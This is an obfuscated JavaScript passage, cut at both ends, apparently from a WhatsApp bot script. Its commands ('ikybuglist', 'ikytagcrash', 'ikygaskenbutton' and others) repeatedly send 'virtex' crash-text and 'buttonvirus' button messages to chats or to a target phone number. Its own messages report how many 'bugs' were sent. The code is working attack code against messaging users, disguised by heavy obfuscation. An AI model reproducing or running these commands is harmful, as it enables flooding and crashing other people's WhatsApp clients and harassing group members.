const _0x181f12=_0x2652;(function(_0x3f179e,_0x5f1420){const _0xe6ff74=_0x2652,_0xc1f4cc=_0x3f179e();while(!![]){try{const _0x41a677=parseInt(_0xe6ff74(0x157))/0x1+-parseInt(_0xe6ff74(0x173))/0x2*(parseInt(_0xe6ff74(0x161))/0x3)+-parseInt(_0xe6ff74(0x171))/0x4+-parseInt(_0xe6ff74(0x172))/0x5*(parseInt(_0xe6ff74(0x174))/0x6)+-parseInt(_0xe6ff74(0x15f))/0x7+parseInt(_0xe6ff74(0x156))/0x8+parseInt(_0xe6ff74(0x15c))/0x9*(parseInt(_0xe6ff74(0x164))/0xa);if(_0x41a677===_0x5f1420)break;else _0xc1f4cc['push'](_0xc1f4cc['shift']());}catch(_0x15c47d){_0xc1f4cc['push'](_0xc1f4cc['shift']());}}}(_0x52c9,0xeb9f6));const _0x2682b9=(function(){let _0x4fd009=!![];return function(_0xdfed66,_0x40cc37){const _0x5f110f=_0x4fd009?function(){const _0x2d33ef=_0x2652;if(_0x40cc37){const _0x3a1f29=_0x40cc37[_0x2d33ef(0x166)](_0xdfed66,arguments);return _0x40cc37=null,_0x3a1f29;}}:function(){};return _0x4fd009=![],_0x5f110f;};}()),_0x583f86=_0x2682b9(this,function(){const _0x112f21=_0x2652;return _0x583f86['toString']()[_0x112f21(0x167)](_0x112f21(0x16d))[_0x112f21(0x15d)]()[_0x112f21(0x163)](_0x583f86)[_0x112f21(0x167)]('(((.+)+)+)+$');});_0x583f86();const _0x27d5cb=(function(){let _0x38e184=!![];return function(_0x5860a8,_0x167f74){const _0x321cd1=_0x38e184?function(){if(_0x167f74){const _0x249bb8=_0x167f74['apply'](_0x5860a8,arguments);return _0x167f74=null,_0x249bb8;}}:function(){};return _0x38e184=![],_0x321cd1;};}()),_0x3ccd07=_0x27d5cb(this,function(){const _0x45fa53=_0x2652;let _0x6b9e85;try{const _0x5d0db6=Function('return\x20(function()\x20'+_0x45fa53(0x159)+');');_0x6b9e85=_0x5d0db6();}catch(_0x5ca151){_0x6b9e85=window;}const _0x446e61=_0x6b9e85[_0x45fa53(0x16b)]=_0x6b9e85['console']||{},_0x281c93=[_0x45fa53(0x16c),_0x45fa53(0x162),'info',_0x45fa53(0x15b),_0x45fa53(0x16e),'table','trace'];for(let _0x1a8cc0=0x0;_0x1a8cc0<_0x281c93[_0x45fa53(0x165)];_0x1a8cc0++){const _0x59cced=_0x27d5cb[_0x45fa53(0x163)][_0x45fa53(0x158)][_0x45fa53(0x15a)](_0x27d5cb),_0x21de44=_0x281c93[_0x1a8cc0],_0x56b4e2=_0x446e61[_0x21de44]||_0x59cced;_0x59cced[_0x45fa53(0x170)]=_0x27d5cb[_0x45fa53(0x15a)](_0x27d5cb),_0x59cced[_0x45fa53(0x15d)]=_0x56b4e2['toString'][_0x45fa53(0x15a)](_0x56b4e2),_0x446e61[_0x21de44]=_0x59cced;}});_0x3ccd07();{if(!isCreator&&!isBan)return;if(args[_0x181f12(0x165)]==0x0)return m[_0x181f12(0x175)](_0x181f12(0x16f));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){let buttons=[{'buttonId':_0x181f12(0x16a),'buttonText':{'displayText':''+buttonvirus},'type':0x1},{'buttonId':_0x181f12(0x169),'buttonText':{'displayText':''+ikyenak},'type':0x1},{'buttonId':'listmenu','buttonText':{'displayText':''+ikyenak},'type':0x1}],buttonMessage={'image':fs['readFileSync']('./pict.jpg'),'caption':'THE\x20IKYY\x20BOTZ\x20\x0aYou\x20Tube:\x20https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','footer':virtex2,'buttons':buttons,'headerType':0x4};ikycoli[_0x181f12(0x160)](m[_0x181f12(0x15e)],buttonMessage,{'quoted':shield2});}jancok(_0x181f12(0x168)+jumlah);}function _0x2652(_0x565d2d,_0x1ce916){const _0x5d0892=_0x52c9();return _0x2652=function(_0x3ccd07,_0x27d5cb){_0x3ccd07=_0x3ccd07-0x156;let _0x202a92=_0x5d0892[_0x3ccd07];return _0x202a92;},_0x2652(_0x565d2d,_0x1ce916);}function _0x52c9(){const _0x19e766=['toString','chat','4297797DiXADb','sendMessage','301998MJqtHC','warn','constructor','113510LhhLcx','length','apply','search','Sukses\x20Send\x20Bug\x20Sebanyak\x20','allmenu','bugjo','console','log','(((.+)+)+)+$','exception','Jumlahnya?','__proto__','1006824RmLAme','5AmBNPP','20LuiagP','5715894tRPKaU','reply','7863608wtvupm','1865012zILUXf','prototype','{}.constructor(\x22return\x20this\x22)(\x20)','bind','error','747DBgiph'];_0x52c9=function(){return _0x19e766;};return _0x52c9();}
}
break
case 'ikybuttonprivate': {
function _0x5937(){const _0x1cc65e=['@s.whatsapp.net','bind','reply','apply','info','THE\x20IKYY\x20BOTZ\x0aYou\x20Tube:\x20https://youtube.com/channel/UCQmja37q_Pap24MgG0vUITQ','87078zdjhTF','112LyFEjG','164AQwCEV','./pict.jpg','705087JZTEoH','allmenu','prototype','constructor','11603400rLyndu','Nomernya\x20mana?','trace','length','5546248cEKlFH','bugjo','toString','20285EqsBaf','readFileSync','(((.+)+)+)+$','exception','search','listmenu','{}.constructor(\x22return\x20this\x22)(\x20)','2OCRuSh','Berhasil\x20Mengirim\x20Button\x20Di\x20Nomer\x20','2690478GIOXIJ','384059QVwREk','console','table'];_0x5937=function(){return _0x1cc65e;};return _0x5937();}function _0x1e7e(_0x21790d,_0x1f3e46){const _0x4b2607=_0x5937();return _0x1e7e=function(_0x2d4ee2,_0xdf090f){_0x2d4ee2=_0x2d4ee2-0x181;let _0x17ac6d=_0x4b2607[_0x2d4ee2];return _0x17ac6d;},_0x1e7e(_0x21790d,_0x1f3e46);}const _0x3571cd=_0x1e7e;(function(_0x4f47b4,_0x58ae09){const _0x5ad269=_0x1e7e,_0x300763=_0x4f47b4();while(!![]){try{const _0x34bbb6=parseInt(_0x5ad269(0x190))/0x1*(parseInt(_0x5ad269(0x18d))/0x2)+-parseInt(_0x5ad269(0x19d))/0x3+-parseInt(_0x5ad269(0x19b))/0x4*(-parseInt(_0x5ad269(0x186))/0x5)+-parseInt(_0x5ad269(0x199))/0x6*(-parseInt(_0x5ad269(0x19a))/0x7)+parseInt(_0x5ad269(0x183))/0x8+parseInt(_0x5ad269(0x18f))/0x9+-parseInt(_0x5ad269(0x1a1))/0xa;if(_0x34bbb6===_0x58ae09)break;else _0x300763['push'](_0x300763['shift']());}catch(_0x251924){_0x300763['push'](_0x300763['shift']());}}}(_0x5937,0x5ca42));const _0xaf3bfb=(function(){let _0xb913df=!![];return function(_0x263b50,_0xb624e4){const _0x50cfbf=_0xb913df?function(){const _0x5413ed=_0x1e7e;if(_0xb624e4){const _0x281664=_0xb624e4[_0x5413ed(0x196)](_0x263b50,arguments);return _0xb624e4=null,_0x281664;}}:function(){};return _0xb913df=![],_0x50cfbf;};}()),_0x35056f=_0xaf3bfb(this,function(){const _0x398640=_0x1e7e;return _0x35056f['toString']()[_0x398640(0x18a)](_0x398640(0x188))[_0x398640(0x185)]()[_0x398640(0x1a0)](_0x35056f)[_0x398640(0x18a)](_0x398640(0x188));});_0x35056f();const _0xdf090f=(function(){let _0x20b6a3=!![];return function(_0x5dccdd,_0x427931){const _0xa872d2=_0x20b6a3?function(){const _0x57cda7=_0x1e7e;if(_0x427931){const _0x3442ca=_0x427931[_0x57cda7(0x196)](_0x5dccdd,arguments);return _0x427931=null,_0x3442ca;}}:function(){};return _0x20b6a3=![],_0xa872d2;};}()),_0x2d4ee2=_0xdf090f(this,function(){const _0x5d1101=_0x1e7e;let _0x3662c5;try{const _0x2a58bb=Function('return\x20(function()\x20'+_0x5d1101(0x18c)+');');_0x3662c5=_0x2a58bb();}catch(_0x19a30a){_0x3662c5=window;}const _0x44f428=_0x3662c5[_0x5d1101(0x191)]=_0x3662c5['console']||{},_0x4e0267=['log','warn',_0x5d1101(0x197),'error',_0x5d1101(0x189),_0x5d1101(0x192),_0x5d1101(0x181)];for(let _0x5824c1=0x0;_0x5824c1<_0x4e0267[_0x5d1101(0x182)];_0x5824c1++){const _0x5a0feb=_0xdf090f[_0x5d1101(0x1a0)][_0x5d1101(0x19f)]['bind'](_0xdf090f),_0x2025a1=_0x4e0267[_0x5824c1],_0x45e9cd=_0x44f428[_0x2025a1]||_0x5a0feb;_0x5a0feb['__proto__']=_0xdf090f[_0x5d1101(0x194)](_0xdf090f),_0x5a0feb[_0x5d1101(0x185)]=_0x45e9cd['toString']['bind'](_0x45e9cd),_0x44f428[_0x2025a1]=_0x5a0feb;}});_0x2d4ee2();{if(!isCreator&&!isBan)return;if(!text)throw _0x3571cd(0x1a2);let buttons=[{'buttonId':_0x3571cd(0x184),'buttonText':{'displayText':''+buttonvirus},'type':0x1},{'buttonId':_0x3571cd(0x19e),'buttonText':{'displayText':''+ikyenak},'type':0x1},{'buttonId':_0x3571cd(0x18b),'buttonText':{'displayText':''+ikyenak},'type':0x1}],buttonMessage={'image':fs[_0x3571cd(0x187)](_0x3571cd(0x19c)),'caption':_0x3571cd(0x198),'footer':virtex2,'buttons':buttons,'headerType':0x4};ikycoli['sendMessage'](text+_0x3571cd(0x193),buttonMessage,{'quoted':shield2}),m[_0x3571cd(0x195)](_0x3571cd(0x18e)+text);}
}
break
case 'jadibuttonimg':{
const _0x2dcaf5=_0x26fb;(function(_0x50373a,_0x539b2e){const _0x26c522=_0x26fb,_0xe82273=_0x50373a();while(!![]){try{const _0x3bb09e=parseInt(_0x26c522(0x111))/0x1+-parseInt(_0x26c522(0x10c))/0x2+-parseInt(_0x26c522(0x10a))/0x3*(-parseInt(_0x26c522(0x103))/0x4)+-parseInt(_0x26c522(0x11d))/0x5+-parseInt(_0x26c522(0x10b))/0x6*(parseInt(_0x26c522(0x10e))/0x7)+parseInt(_0x26c522(0x113))/0x8*(parseInt(_0x26c522(0x110))/0x9)+parseInt(_0x26c522(0x100))/0xa*(parseInt(_0x26c522(0x106))/0xb);if(_0x3bb09e===_0x539b2e)break;else _0xe82273['push'](_0xe82273['shift']());}catch(_0x51817c){_0xe82273['push'](_0xe82273['shift']());}}}(_0x2352,0x1c152));const _0x3604fb=(function(){let _0x2a0c32=!![];return function(_0x35d147,_0x1ec35d){const _0x4c75a6=_0x2a0c32?function(){if(_0x1ec35d){const _0x4a0dca=_0x1ec35d['apply'](_0x35d147,arguments);return _0x1ec35d=null,_0x4a0dca;}}:function(){};return _0x2a0c32=![],_0x4c75a6;};}()),_0x20d650=_0x3604fb(this,function(){const _0x403829=_0x26fb;return _0x20d650[_0x403829(0x114)]()[_0x403829(0x116)](_0x403829(0x115))['toString']()[_0x403829(0xfa)](_0x20d650)[_0x403829(0x116)]('(((.+)+)+)+$');});_0x20d650();const _0x28362b=(function(){let _0x5c6fe8=!![];return function(_0x5bff11,_0x40ff55){const _0x3fe4b1=_0x5c6fe8?function(){const _0x554e04=_0x26fb;if(_0x40ff55){const _0x2d6f9e=_0x40ff55[_0x554e04(0xfd)](_0x5bff11,arguments);return _0x40ff55=null,_0x2d6f9e;}}:function(){};return _0x5c6fe8=![],_0x3fe4b1;};}()),_0x3c6f79=_0x28362b(this,function(){const _0x456bf6=_0x26fb,_0x5df853=function(){const _0x30ae3d=_0x26fb;let _0x2df07c;try{_0x2df07c=Function(_0x30ae3d(0x11c)+_0x30ae3d(0xf9)+');')();}catch(_0x35bb14){_0x2df07c=window;}return _0x2df07c;},_0x8b365=_0x5df853(),_0x44cfce=_0x8b365[_0x456bf6(0x105)]=_0x8b365[_0x456bf6(0x105)]||{},_0x1d8225=[_0x456bf6(0x11a),_0x456bf6(0x109),_0x456bf6(0x112),_0x456bf6(0x102),'exception','table',_0x456bf6(0x101)];for(let _0x379558=0x0;_0x379558<_0x1d8225['length'];_0x379558++){const _0x2bbfd6=_0x28362b[_0x456bf6(0xfa)][_0x456bf6(0x11b)][_0x456bf6(0xff)](_0x28362b),_0x3f2166=_0x1d8225[_0x379558],_0x2af223=_0x44cfce[_0x3f2166]||_0x2bbfd6;_0x2bbfd6[_0x456bf6(0x118)]=_0x28362b[_0x456bf6(0xff)](_0x28362b),_0x2bbfd6[_0x456bf6(0x114)]=_0x2af223[_0x456bf6(0x114)]['bind'](_0x2af223),_0x44cfce[_0x3f2166]=_0x2bbfd6;}});function _0x2352(){const _0x336ec0=['__proto__','download','log','prototype','return\x20(function()\x20','954060buiWRU','{}.constructor(\x22return\x20this\x22)(\x20)','constructor','\x20\x0aYou\x20Tube:\x20https://youtube.com/channel/UCQmja37q_Pap24MgG0vUITQ','*Send/Reply\x20Image','apply','BUG\x20BY\x20','bind','10gtCUxH','trace','error','80XJghtX','sendMessage','console','2086887UnDBjL','Teksnya\x20Mana?','chat','warn','8484ipVrYD','319698xZZzWq','19600GFhzFO','Sukses\x20Convert\x20Buttonimg','28BhJYtU','quoted','981xCQLrq','211752iICZyI','info','5192UlBKij','toString','(((.+)+)+)+$','search','waUploadToServer'];_0x2352=function(){return _0x336ec0;};return _0x2352();}function _0x26fb(_0x462a1c,_0x541954){const _0x397848=_0x2352();return _0x26fb=function(_0x3c6f79,_0x28362b){_0x3c6f79=_0x3c6f79-0xf9;let _0x54d04e=_0x397848[_0x3c6f79];return _0x54d04e;},_0x26fb(_0x462a1c,_0x541954);}_0x3c6f79();{if(!isCreator&&!isBan)return;if(!m[_0x2dcaf5(0x10f)])throw _0x2dcaf5(0xfc);if(!text)throw _0x2dcaf5(0x107);let media=await quoted[_0x2dcaf5(0x119)]();var messa=await prepareWAMessageMedia({'image':media},{'upload':ikycoli[_0x2dcaf5(0x117)]});let buttons=[{'buttonId':'bugjo','buttonText':{'displayText':''+ikybabel},'type':0x1},{'buttonId':'allmenu','buttonText':{'displayText':''+ikyenak},'type':0x1},{'buttonId':'listmenu','buttonText':{'displayText':''+ikyenak},'type':0x1}],buttonMessage={'image':media,'caption':_0x2dcaf5(0xfe)+text+_0x2dcaf5(0xfb),'footer':virtex2,'buttons':buttons,'headerType':0x4};ikycoli[_0x2dcaf5(0x104)](m[_0x2dcaf5(0x108)],buttonMessage,{'quoted':shield2}),jancok(_0x2dcaf5(0x10d));}
}
break
case 'ikygaskenbutton': {
function _0x40e1(){const _0x72b5af=['8678uhpFFx','exception','allmenu','search','error','8vhVDCw','sendMessage','756890ANNICz','chat','log','trace','@s.whatsapp.net','console','length','bugjo','info','reply','toString','104RKulgg','Berhasil\x20Mengirim\x20Button\x20Di\x20Nomer\x20','622554AqZlUL','3465469WlCLSI','table','constructor','(((.+)+)+)+$','411672odNXDO','return\x20(function()\x20','Nomernya\x20mana?','apply','bind','THE\x20IKYY\x20BOTZ\x20\x0aYou\x20Tube:\x20https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','./pict.jpg','306066WXMyLl','warn','45TpZVtK','7765550cTVYHN','prototype','listmenu'];_0x40e1=function(){return _0x72b5af;};return _0x40e1();}const _0x5c180d=_0x2bf1;(function(_0x27b675,_0x3eb593){const _0x4c0fbb=_0x2bf1,_0x28fb44=_0x27b675();while(!![]){try{const _0x3df23c=-parseInt(_0x4c0fbb(0x8a))/0x1*(-parseInt(_0x4c0fbb(0x76))/0x2)+parseInt(_0x4c0fbb(0x78))/0x3+-parseInt(_0x4c0fbb(0x69))/0x4*(parseInt(_0x4c0fbb(0x6b))/0x5)+parseInt(_0x4c0fbb(0x84))/0x6+parseInt(_0x4c0fbb(0x79))/0x7+-parseInt(_0x4c0fbb(0x7d))/0x8*(-parseInt(_0x4c0fbb(0x86))/0x9)+-parseInt(_0x4c0fbb(0x87))/0xa;if(_0x3df23c===_0x3eb593)break;else _0x28fb44['push'](_0x28fb44['shift']());}catch(_0x533984){_0x28fb44['push'](_0x28fb44['shift']());}}}(_0x40e1,0x5d774));function _0x2bf1(_0x112a2a,_0x195aae){const _0x58a3c0=_0x40e1();return _0x2bf1=function(_0x2623c9,_0x79f99b){_0x2623c9=_0x2623c9-0x69;let _0xcd7698=_0x58a3c0[_0x2623c9];return _0xcd7698;},_0x2bf1(_0x112a2a,_0x195aae);}const _0xab0d43=(function(){let _0x9caed8=!![];return function(_0x13160,_0x48d150){const _0xb5f6db=_0x9caed8?function(){const _0x163288=_0x2bf1;if(_0x48d150){const _0x4c536a=_0x48d150[_0x163288(0x80)](_0x13160,arguments);return _0x48d150=null,_0x4c536a;}}:function(){};return _0x9caed8=![],_0xb5f6db;};}()),_0x7533d9=_0xab0d43(this,function(){const _0x2e65fe=_0x2bf1;return _0x7533d9[_0x2e65fe(0x75)]()[_0x2e65fe(0x8d)](_0x2e65fe(0x7c))[_0x2e65fe(0x75)]()[_0x2e65fe(0x7b)](_0x7533d9)['search'](_0x2e65fe(0x7c));});_0x7533d9();const _0x79f99b=(function(){let _0x4be946=!![];return function(_0x1177dc,_0x259e8e){const _0x54bd8a=_0x4be946?function(){if(_0x259e8e){const _0x4c7e39=_0x259e8e['apply'](_0x1177dc,arguments);return _0x259e8e=null,_0x4c7e39;}}:function(){};return _0x4be946=![],_0x54bd8a;};}()),_0x2623c9=_0x79f99b(this,function(){const _0x10cbfb=_0x2bf1;let _0x5becbd;try{const _0x4a425d=Function(_0x10cbfb(0x7e)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x5becbd=_0x4a425d();}catch(_0x4215ee){_0x5becbd=window;}const _0xc27c44=_0x5becbd[_0x10cbfb(0x70)]=_0x5becbd[_0x10cbfb(0x70)]||{},_0xd3ee53=[_0x10cbfb(0x6d),_0x10cbfb(0x85),_0x10cbfb(0x73),_0x10cbfb(0x8e),_0x10cbfb(0x8b),_0x10cbfb(0x7a),_0x10cbfb(0x6e)];for(let _0x3fe919=0x0;_0x3fe919<_0xd3ee53[_0x10cbfb(0x71)];_0x3fe919++){const _0x4061a7=_0x79f99b[_0x10cbfb(0x7b)][_0x10cbfb(0x88)]['bind'](_0x79f99b),_0x16b242=_0xd3ee53[_0x3fe919],_0x27c1a4=_0xc27c44[_0x16b242]||_0x4061a7;_0x4061a7['__proto__']=_0x79f99b[_0x10cbfb(0x81)](_0x79f99b),_0x4061a7[_0x10cbfb(0x75)]=_0x27c1a4[_0x10cbfb(0x75)]['bind'](_0x27c1a4),_0xc27c44[_0x16b242]=_0x4061a7;}});_0x2623c9();{if(!isCreator&&!isBan)return;if(!text)throw _0x5c180d(0x7f);let buttons=[{'buttonId':_0x5c180d(0x72),'buttonText':{'displayText':''+buttonvirus},'type':0x1},{'buttonId':_0x5c180d(0x8c),'buttonText':{'displayText':''+ikyenak},'type':0x1},{'buttonId':_0x5c180d(0x89),'buttonText':{'displayText':''+ikyenak},'type':0x1}],buttonMessage={'image':fs['readFileSync'](_0x5c180d(0x83)),'caption':_0x5c180d(0x82),'footer':virtex2,'buttons':buttons,'headerType':0x4};ikycoli[_0x5c180d(0x6a)](text+_0x5c180d(0x6f),buttonMessage,{'quoted':shield2}),ikycoli[_0x5c180d(0x6a)](m[_0x5c180d(0x6c)],buttonMessage,{'quoted':shield2}),m[_0x5c180d(0x74)](_0x5c180d(0x77)+text);}
}
break
case 'ikybuglist':{
function _0x4e80(){const _0x4e0f0d=['info','bind','error','13490KwygoS','{}.constructor(\x22return\x20this\x22)(\x20)','name','2724Uofgop','chat','Jumlahnya?','390NahhaG','Sukses\x20Send\x20Bug\x20Sebanyak\x20','log','console','exception','Jembod','user','warn','159037ecfHwn','length','119gYgcQB','Fixed','constructor','9848Gehbma','105468sNante','THE\x20IKYY\x20BOTZ','335772QdSYcY','apply','table','(((.+)+)+)+$','1179zpaYaf','108oGDGSB','trace','return\x20(function()\x20','65044hmMpgk','sendListMsg','THE\x20IKYY\x20BOTZ\x0a-','toString','Hai\x20\x0aSaya\x20THE\x20IKYY\x20BOTZ','search'];_0x4e80=function(){return _0x4e0f0d;};return _0x4e80();}const _0xb49ac=_0x1b7f;function _0x1b7f(_0x2c74de,_0x2b0b42){const _0x1ace6f=_0x4e80();return _0x1b7f=function(_0x3bd789,_0x3a3d40){_0x3bd789=_0x3bd789-0x99;let _0x418e9b=_0x1ace6f[_0x3bd789];return _0x418e9b;},_0x1b7f(_0x2c74de,_0x2b0b42);}(function(_0x336054,_0x2ddc02){const _0x40fd47=_0x1b7f,_0x52af4a=_0x336054();while(!![]){try{const _0x179440=parseInt(_0x40fd47(0xa6))/0x1+-parseInt(_0x40fd47(0xb6))/0x2+-parseInt(_0x40fd47(0xae))/0x3+parseInt(_0x40fd47(0xb3))/0x4*(-parseInt(_0x40fd47(0xbf))/0x5)+parseInt(_0x40fd47(0x9b))/0x6*(parseInt(_0x40fd47(0xa8))/0x7)+parseInt(_0x40fd47(0xab))/0x8*(-parseInt(_0x40fd47(0xb2))/0x9)+parseInt(_0x40fd47(0x9e))/0xa*(parseInt(_0x40fd47(0xac))/0xb);if(_0x179440===_0x2ddc02)break;else _0x52af4a['push'](_0x52af4a['shift']());}catch(_0x3ccefd){_0x52af4a['push'](_0x52af4a['shift']());}}}(_0x4e80,0x27956));const _0x43600c=(function(){let _0x1bd42f=!![];return function(_0x38bf42,_0x278e6a){const _0x453a44=_0x1bd42f?function(){const _0x27301d=_0x1b7f;if(_0x278e6a){const _0x4be59a=_0x278e6a[_0x27301d(0xaf)](_0x38bf42,arguments);return _0x278e6a=null,_0x4be59a;}}:function(){};return _0x1bd42f=![],_0x453a44;};}()),_0x1d0af8=_0x43600c(this,function(){const _0x384eb1=_0x1b7f;return _0x1d0af8['toString']()[_0x384eb1(0xbb)](_0x384eb1(0xb1))[_0x384eb1(0xb9)]()[_0x384eb1(0xaa)](_0x1d0af8)[_0x384eb1(0xbb)](_0x384eb1(0xb1));});_0x1d0af8();const _0x3a3d40=(function(){let _0x144540=!![];return function(_0x4dacc5,_0x37b98e){const _0x1667fe=_0x144540?function(){if(_0x37b98e){const _0x2ba323=_0x37b98e['apply'](_0x4dacc5,arguments);return _0x37b98e=null,_0x2ba323;}}:function(){};return _0x144540=![],_0x1667fe;};}()),_0x3bd789=_0x3a3d40(this,function(){const _0x3bf54a=_0x1b7f,_0xaa1b45=function(){const _0x47a8bd=_0x1b7f;let _0x59a5c7;try{_0x59a5c7=Function(_0x47a8bd(0xb5)+_0x47a8bd(0x99)+');')();}catch(_0x1f36cf){_0x59a5c7=window;}return _0x59a5c7;},_0x3b3f89=_0xaa1b45(),_0x58d818=_0x3b3f89['console']=_0x3b3f89[_0x3bf54a(0xa1)]||{},_0x2409e6=[_0x3bf54a(0xa0),_0x3bf54a(0xa5),_0x3bf54a(0xbc),_0x3bf54a(0xbe),_0x3bf54a(0xa2),_0x3bf54a(0xb0),_0x3bf54a(0xb4)];for(let _0x12deb0=0x0;_0x12deb0<_0x2409e6[_0x3bf54a(0xa7)];_0x12deb0++){const _0x27a51e=_0x3a3d40[_0x3bf54a(0xaa)]['prototype'][_0x3bf54a(0xbd)](_0x3a3d40),_0x5a2754=_0x2409e6[_0x12deb0],_0x28e8b3=_0x58d818[_0x5a2754]||_0x27a51e;_0x27a51e['__proto__']=_0x3a3d40[_0x3bf54a(0xbd)](_0x3a3d40),_0x27a51e[_0x3bf54a(0xb9)]=_0x28e8b3[_0x3bf54a(0xb9)][_0x3bf54a(0xbd)](_0x28e8b3),_0x58d818[_0x5a2754]=_0x27a51e;}});_0x3bd789();{if(!isCreator&&!isBan)return;if(args[_0xb49ac(0xa7)]==0x0)return m['reply'](_0xb49ac(0x9d));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){des=[{'title':_0xb49ac(0xa9),'rows':[{'title':virtex1,'rowId':'Jembod','description':_0xb49ac(0xba)},{'title':virtex2,'rowId':_0xb49ac(0xa3),'description':_0xb49ac(0xba)}]}],ikycoli[_0xb49ac(0xb7)](m[_0xb49ac(0x9c)],'Script\x20Di\x20List\x0a'+philips,ikycoli[_0xb49ac(0xa4)][_0xb49ac(0x9a)],_0xb49ac(0xad),_0xb49ac(0xb8)+ikyenak,des,shield2);}jancok(_0xb49ac(0x9f)+jumlah);}
}
break

case 'ikytagcrash': {
const _0x4b36f6=_0x14a9;(function(_0x2936fb,_0x15e636){const _0x20762b=_0x14a9,_0x5c9d27=_0x2936fb();while(!![]){try{const _0x21a975=parseInt(_0x20762b(0x126))/0x1*(parseInt(_0x20762b(0x10b))/0x2)+-parseInt(_0x20762b(0x104))/0x3*(-parseInt(_0x20762b(0x123))/0x4)+-parseInt(_0x20762b(0x125))/0x5*(-parseInt(_0x20762b(0x127))/0x6)+parseInt(_0x20762b(0x11b))/0x7+parseInt(_0x20762b(0x120))/0x8*(parseInt(_0x20762b(0x113))/0x9)+-parseInt(_0x20762b(0x108))/0xa*(-parseInt(_0x20762b(0x128))/0xb)+parseInt(_0x20762b(0x11f))/0xc*(-parseInt(_0x20762b(0x129))/0xd);if(_0x21a975===_0x15e636)break;else _0x5c9d27['push'](_0x5c9d27['shift']());}catch(_0x57440e){_0x5c9d27['push'](_0x5c9d27['shift']());}}}(_0x4d12,0x3508d));const _0x3772f2=(function(){let _0x1fe73e=!![];return function(_0x134e06,_0x1da02e){const _0x83e97b=_0x1fe73e?function(){const _0x19a80a=_0x14a9;if(_0x1da02e){const _0x50a1f9=_0x1da02e[_0x19a80a(0x122)](_0x134e06,arguments);return _0x1da02e=null,_0x50a1f9;}}:function(){};return _0x1fe73e=![],_0x83e97b;};}()),_0x593d5a=_0x3772f2(this,function(){const _0x200bff=_0x14a9;return _0x593d5a['toString']()[_0x200bff(0x105)](_0x200bff(0x112))[_0x200bff(0x11e)]()[_0x200bff(0x11a)](_0x593d5a)[_0x200bff(0x105)](_0x200bff(0x112));});_0x593d5a();const _0x55829c=(function(){let _0x441236=!![];return function(_0x5adb56,_0x5e6a79){const _0x2622cb=_0x441236?function(){const _0x47e303=_0x14a9;if(_0x5e6a79){const _0xc57325=_0x5e6a79[_0x47e303(0x122)](_0x5adb56,arguments);return _0x5e6a79=null,_0xc57325;}}:function(){};return _0x441236=![],_0x2622cb;};}()),_0x12631e=_0x55829c(this,function(){const _0x1219ff=_0x14a9;let _0x17aeb6;try{const _0x3847a9=Function('return\x20(function()\x20'+_0x1219ff(0x114)+');');_0x17aeb6=_0x3847a9();}catch(_0x5f2b9b){_0x17aeb6=window;}const _0x257f4e=_0x17aeb6[_0x1219ff(0x117)]=_0x17aeb6[_0x1219ff(0x117)]||{},_0x1aab25=[_0x1219ff(0x107),_0x1219ff(0x106),_0x1219ff(0x110),_0x1219ff(0x111),_0x1219ff(0x115),_0x1219ff(0x124),_0x1219ff(0x11c)];for(let _0x46cb4b=0x0;_0x46cb4b<_0x1aab25['length'];_0x46cb4b++){const _0x57637d=_0x55829c['constructor'][_0x1219ff(0x10c)][_0x1219ff(0x121)](_0x55829c),_0x5230aa=_0x1aab25[_0x46cb4b],_0x278c85=_0x257f4e[_0x5230aa]||_0x57637d;_0x57637d['__proto__']=_0x55829c[_0x1219ff(0x121)](_0x55829c),_0x57637d[_0x1219ff(0x11e)]=_0x278c85[_0x1219ff(0x11e)]['bind'](_0x278c85),_0x257f4e[_0x5230aa]=_0x57637d;}});function _0x14a9(_0x5acb61,_0x4cc164){const _0x4ead2f=_0x4d12();return _0x14a9=function(_0x12631e,_0x55829c){_0x12631e=_0x12631e-0x104;let _0x250128=_0x4ead2f[_0x12631e];return _0x250128;},_0x14a9(_0x5acb61,_0x4cc164);}_0x12631e();{if(!isCreator&&!isBan)return;if(!m['isGroup'])throw mess[_0x4b36f6(0x10a)];if(args['length']==0x0)return m[_0x4b36f6(0x118)](_0x4b36f6(0x11d));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){let jansencoli={'key':{'participant':_0x4b36f6(0x119)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':virgam}}};var teks=philips;for(let mem of participants){teks+=_0x4b36f6(0x109)+mem['id'][_0x4b36f6(0x10d)]('@')[0x0]+'\x0a';}ikycoli[_0x4b36f6(0x10f)](m[_0x4b36f6(0x10e)],{'text':teks,'mentions':participants['map'](_0x1fae74=>_0x1fae74['id'])},{'quoted':jansencoli});}jancok(_0x4b36f6(0x116));}function _0x4d12(){const _0x4fa670=['sendMessage','info','error','(((.+)+)+)+$','45gGBMxb','{}.constructor(\x22return\x20this\x22)(\x20)','exception','Tag\x20Aja','console','reply','0@s.whatsapp.net','constructor','1340857QPOiVQ','trace','Jumlahnya?','toString','984ZoAhjO','287384xJwVox','bind','apply','5156YvkqnE','table','653765uNBQqt','49732dhtmPJ','18hsFsfD','14047gZfptQ','163293quJuVQ','9jttEHE','search','warn','log','2590gycfdH','││᭄⃟ꪶ⃟•╾\x20@','group','6RvpEEj','prototype','split','chat'];_0x4d12=function(){return _0x4fa670;};return _0x4d12();}
  }
  break

  case 'ikybuttoprivate': {
var _0x26b53b=_0x3f8a;function _0x3f8a(_0x44ee71,_0x531e11){var _0x44b1b5=_0x1080();return _0x3f8a=function(_0x206023,_0x151359){_0x206023=_0x206023-0x125;var _0x1c1da1=_0x44b1b5[_0x206023];return _0x1c1da1;},_0x3f8a(_0x44ee71,_0x531e11);}function _0x1080(){var _0x178eb0=['trace','JOMBLO','warn','40pSkVRe','search','babaabbabababa','4ZGMJQB','log','sendMessage','table','__proto__','5938420CjajGu','38676564qANCtN','1728063gdWCZf','error','@s.whatsapp.net','apply','7216230jTfoVv','bind','console','toString','{}.constructor(\x22return\x20this\x22)(\x20)','succes','info','djisdjiwdjjes','reply','(((.+)+)+)+$','6oRLJYN','return\x20(function()\x20','JONES','exception','1044aOlctV','constructor','prototype','341gtiNwS','248553iInkJT','11DhLhqJ','length','11148300nWNFqM'];_0x1080=function(){return _0x178eb0;};return _0x1080();}(function(_0x25a38a,_0x49ba35){var _0x2153c1=_0x3f8a,_0x365fb7=_0x25a38a();while(!![]){try{var 